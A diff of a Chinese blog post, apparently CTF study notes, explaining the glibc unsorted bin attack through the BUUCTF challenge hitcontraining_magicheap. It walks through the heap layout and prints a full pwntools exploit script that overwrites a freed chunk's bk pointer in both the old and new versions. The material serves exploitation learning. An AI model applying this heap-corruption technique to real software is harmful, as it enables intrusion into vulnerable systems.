@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[TOC]">
+  <meta name="description" content="unsorted bin attack漏洞例题：【BUUCTF】hitcontraining_magicheap">
 <meta property="og:type" content="article">
 <meta property="og:title" content="unsorted bin attack学习笔记">
 <meta property="og:url" content="http://example.com/2024/07/09/unsorted-bin-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Qwen&#39;s blog">
-<meta property="og:description" content="[TOC]">
+<meta property="og:description" content="unsorted bin attack漏洞例题：【BUUCTF】hitcontraining_magicheap">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042969.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042712.png">
@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042515.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042463.png">
 <meta property="article:published_time" content="2024-07-09T12:42:01.000Z">
-<meta property="article:modified_time" content="2025-05-01T13:26:48.744Z">
+<meta property="article:modified_time" content="2025-10-16T13:24:15.827Z">
 <meta property="article:author" content="Qwen">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="堆">
@@ -228,7 +228,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-01 21:26:48" itemprop="dateModified" datetime="2025-05-01T21:26:48+08:00">2025-05-01</time>
+                <time title="修改时间：2025-10-16 21:24:15" itemprop="dateModified" datetime="2025-10-16T21:24:15+08:00">2025-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -257,7 +257,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.6k</span>
+              <span>1.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -276,21 +276,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>[TOC]</p>
+        <p><code>unsorted bin attack</code>漏洞例题：【BUUCTF】hitcontraining_magicheap</p>
 <span id="more"></span>
 
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
-<p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p>
-<p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p>
-<p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>
-</blockquote>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><code>hitcontraining_magicheap</code></p>
-<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a><em>main</em></h4><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042969.png" alt="image-20240708114125665" style="zoom:67%;" />
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a><em>main</em></h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042969.png" alt="image-20240708114125665" style="zoom:67%;" />
 
-<h4 id="exit-heap"><a href="#exit-heap" class="headerlink" title="exit_heap"></a><em>exit_heap</em></h4><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042712.png" alt="image-20240708113615058" style="zoom:67%;" />
+<h3 id="exit-heap"><a href="#exit-heap" class="headerlink" title="exit_heap"></a><em>exit_heap</em></h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042712.png" alt="image-20240708113615058" style="zoom:67%;" />
 
-<h4 id="read-input"><a href="#read-input" class="headerlink" title="read_input"></a><em>read_input</em></h4><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042653.png" alt="image-20240708113219495"></p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	先申请三个<em>chunk</em>，然后<em>free</em>掉<em>chunk1</em>。<em>chunk2</em>的作用是防止<em>free chunk1</em>后，<em>chunk0</em>与<em>top chunk</em>合并。<code>fast bin</code>中的<em>chunk</em>大小的范围在 <code>0x20~0x80</code> 之间，所以我们我们在申请第二个<em>chunk</em>的时候其大小要大于0x80，才能使<em>free chunk1</em>后<em>chunk1</em>在<code>unsorted bin</code>中。</p>
+<h3 id="read-input"><a href="#read-input" class="headerlink" title="read_input"></a><em>read_input</em></h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042653.png" alt="image-20240708113219495"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	先申请三个<em>chunk</em>，然后<em>free</em>掉<em>chunk1</em>。<em>chunk2</em>的作用是防止<em>free chunk1</em>后，<em>chunk0</em>与<em>top chunk</em>合并。<code>fast bin</code>中的<em>chunk</em>大小的范围在 <code>0x20~0x80</code> 之间，所以我们我们在申请第二个<em>chunk</em>的时候其大小要大于0x80，才能使<em>free chunk1</em>后<em>chunk1</em>在<code>unsorted bin</code>中。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 
 <p>如图：</p>
@@ -306,7 +300,7 @@
 
 <p>如图：</p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042463.png" alt="image-20240708111356583"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27610)</span></span><br><span class="line">debug(p,<span class="number">0x400d0b</span>,<span class="number">0x400d17</span>,<span class="number">0x400d23</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020a0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4869</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27610)</span></span><br><span class="line">debug(p,<span class="number">0x400d0b</span>,<span class="number">0x400d17</span>,<span class="number">0x400d23</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020a0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4869</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
     </div>
@@ -400,7 +394,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.1.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main"><span class="nav-number">2.1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exit-heap"><span class="nav-number">2.1.2.</span> <span class="nav-text">exit_heap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#read-input"><span class="nav-number">2.1.3.</span> <span class="nav-text">read_input</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main"><span class="nav-number">1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exit-heap"><span class="nav-number">1.2.</span> <span class="nav-text">exit_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#read-input"><span class="nav-number">1.3.</span> <span class="nav-text">read_input</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -416,7 +410,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">59</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -465,12 +459,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">284k</span>
+    <span title="站点总字数">280k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:18</span>
+    <span title="站点阅读时长">4:15</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
